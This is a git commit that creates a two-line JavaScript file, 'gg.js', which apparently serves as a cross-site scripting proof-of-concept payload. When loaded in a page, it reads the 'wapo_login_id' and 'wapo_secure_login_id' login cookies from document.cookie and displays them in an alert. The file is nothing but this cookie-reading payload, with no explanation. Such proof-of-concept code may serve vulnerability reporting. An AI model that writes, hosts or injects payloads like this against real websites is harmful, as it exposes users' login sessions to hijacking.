0a9d85ad4036c9c7e8defaf2f4f95b3cb6398f7d
Romiyo karki <68746860+romiyokarkicodes@users.noreply.github.com>
2026-03-18 20:31:07 +0545

    Create gg.js

---
+++ gg.js
@@ -0,0 +1,2 @@
+alert('wapo_login_id: ' + (document.cookie.match(/wapo_login_id=([^;]+)/) ? document.cookie.match(/wapo_login_id=([^;]+)/)[1] : 'Not Found') + '\n\nwapo_secure_login_id: ' + (document.cookie.match(/wapo_secure_login_id=([^;]+)/) ? document.cookie.match(/wapo_secure_login_id=([^;]+)/)[1] : 'Not Found'));
+module.exports = function() {};
